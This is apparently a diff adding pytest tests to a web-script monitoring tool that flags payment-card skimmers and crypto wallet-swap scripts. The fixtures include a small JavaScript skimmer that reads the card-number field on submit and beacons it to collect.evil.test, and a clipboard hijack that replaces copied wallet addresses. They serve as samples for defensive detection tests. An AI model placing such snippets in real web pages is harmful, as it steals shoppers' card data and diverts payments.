@@ -122,8 +122,14 @@ async def test_a_vendor_change_raises_a_finding_with_the_diff(
     assert detail["reasons"] == [
         "the code changed",
         "references new hosts: collect.evil.test",
+        "watches form input (change) and sends data to collect.evil.test",
         "runs on a payment page",
     ]
+    assert [v["rule"] for v in detail["verdicts"]] == ["skimmer.form_data"]
+    assert {(s["rule"], s["key"]) for s in detail["signals_added"]} == {
+        ("collect.form_listener", "change"),
+        ("exfil.beacon", "collect.evil.test"),
+    }
     assert detail["pages"] == [shop.site.url("/checkout"), shop.site.url("/product")]
     assert detail["payment_page"] is True
     assert detail["hosts_added"] == ["collect.evil.test"]
@@ -455,6 +461,8 @@ async def test_diffing_a_script_without_versions(session: AsyncSession, shop: Sh
     script = await versions.find_script(session, "shop", shop.vendor)
     with pytest.raises(ValidationError, match="no versions yet"):
         await versions.diff_versions(session, "shop", script.id)
+    with pytest.raises(ValidationError, match="no versions yet"):
+        await versions.inspect_version(session, "shop", script.id)
 
 
 async def test_inline_scripts_without_current_bodies_match_by_position(
@@ -478,3 +486,118 @@ async def test_inline_scripts_without_current_bodies_match_by_position(
         f"{checkout}#inline-2",
         shop.vendor,
     }
+
+
+# --- Skimmer heuristics in findings ------------------------------------------------------
+
+SKIMMER = (
+    b"(function(){var q=window.q=[];q.push('load');"
+    b"document.addEventListener('submit',function(){"
+    b"navigator.sendBeacon('https://collect.evil.test/c',"
+    b"document.querySelector('#cc-number').value)});})();\n"
+)
+
+
+async def test_a_skimmer_on_the_first_scan_is_suspicious(session: AsyncSession, shop: Shop) -> None:
+    shop.set_vendor(SKIMMER)
+    await _register(session, shop, product=True)
+    scan, raised = await _scan(session)
+    # The page's first scan is still its baseline: only the flagged script is reported.
+    assert scan.findings_new == 1
+    [finding] = raised
+    assert finding.kind == FindingKind.SCRIPT_SUSPICIOUS
+    assert finding.severity is Severity.CRITICAL
+    assert finding.title == f"Suspicious script on a payment page: {shop.vendor}"
+    assert finding.previous_version_id is None
+    detail = finding.detail
+    assert detail["reasons"] == [
+        "found on the page's first scan",
+        "reads payment card fields (cc-number) and sends data to collect.evil.test",
+        "watches form input (submit) and sends data to collect.evil.test",
+        "runs on a payment page",
+    ]
+    assert [v["rule"] for v in detail["verdicts"]] == ["skimmer.card_data", "skimmer.form_data"]
+    assert {s["rule"] for s in detail["signals"]} == {
+        "collect.form_listener",
+        "collect.card_field",
+        "exfil.beacon",
+    }
+    assert detail["host"] == "127.0.0.1"
+    assert detail["signals_truncated"] is False
+    assert detail["hidden_hosts"] == []
+    script = await versions.find_script(session, "shop", shop.vendor)
+    assert script.current_version_ids == [str(finding.version_id)]
+    # Nothing changes on the next scan: no new finding.
+    assert (await _scan(session))[1] == []
+
+
+async def test_a_flagged_script_that_isnt_high_stays_in_the_baseline(
+    session: AsyncSession, shop: Shop
+) -> None:
+    # Hard-codes a wallet address (medium): worth a look, not worth breaking the baseline.
+    shop.set_checkout('var tip = "0x1111111111111111111111111111111111111111";')
+    shop.cdn.set("/sdk/widget.js", b"nope", status=404)  # and a body that never arrives
+    await _register(session, shop)
+    _, raised = await _scan(session)
+    assert raised == []
+
+
+async def test_new_scripts_carry_the_heuristics(session: AsyncSession, shop: Shop) -> None:
+    await _register(session, shop, product=True)
+    await _scan(session)
+    swap = (
+        'var mine = "0x1111111111111111111111111111111111111111";'
+        "document.addEventListener('copy', function (e) {"
+        "e.clipboardData.setData('text/plain', mine); e.preventDefault(); });"
+    )
+    shop.site.page("/product", f'<script src="{shop.vendor}"></script><script>{swap}</script>')
+    _, [added] = await _scan(session)
+    assert added.kind == FindingKind.SCRIPT_ADDED
+    # A new inline script is low; the wallet swap pattern makes it high.
+    assert added.severity is Severity.HIGH
+    assert added.detail["reasons"] == [
+        "a new inline script",
+        "handles crypto wallet addresses and the clipboard, the pattern of "
+        "address-swapping malware",
+    ]
+    assert [v["rule"] for v in added.detail["verdicts"]] == ["wallet.swap"]
+
+
+async def test_first_party_destinations_are_not_exfiltration(
+    session: AsyncSession, shop: Shop
+) -> None:
+    await _register(session, shop)
+    await _scan(session)
+    # Posting the card form to the site's own API, and to the script's own host, is normal.
+    shop.set_vendor(
+        WIDGET.replace(
+            b"q.push('load');",
+            b"q.push('load');fetch('" + shop.cdn.url("/tokens").encode() + b"',"
+            b"{body:document.querySelector('#cc-number').value});",
+        )
+    )
+    shop.set_checkout("pay();", "q('#cvv'); fetch('/api/pay', {method: 'POST'});")
+    _, raised = await _scan(session)
+    by_kind = {f.kind: f for f in raised}
+    assert set(by_kind) == {FindingKind.SCRIPT_CHANGED, FindingKind.SCRIPT_ADDED}
+    assert by_kind[FindingKind.SCRIPT_CHANGED].detail["verdicts"] == []
+    assert by_kind[FindingKind.SCRIPT_ADDED].detail["verdicts"] == []
+
+
+async def test_inspecting_a_stored_version(session: AsyncSession, shop: Shop) -> None:
+    await _register(session, shop)
+    await _scan(session)
+    shop.set_vendor(SKIMMER)
+    await _scan(session)
+    script = await versions.find_script(session, "shop", shop.vendor)
+    latest = await versions.inspect_version(session, "shop", script.id)
+    assert [v.rule for v in latest.verdicts] == ["skimmer.card_data", "skimmer.form_data"]
+    assert latest.context.script_host == "127.0.0.1"
+    assert latest.context.site_hosts == {"127.0.0.1"}
+    history = (await versions.versions_by_script(session, [script.id]))[script.id]
+    assert latest.version.id == history[0].id
+    first = await versions.inspect_version(session, "shop", script.id, ref=history[1].sha384[:10])
+    assert (first.version.id, first.verdicts) == (history[1].id, [])
+    # The diff of the two shows the same verdicts, as new behaviour.
+    diff = await versions.diff_versions(session, "shop", script.id)
+    assert [v.rule for v in diff.analysis.verdicts] == ["skimmer.card_data", "skimmer.form_data"]
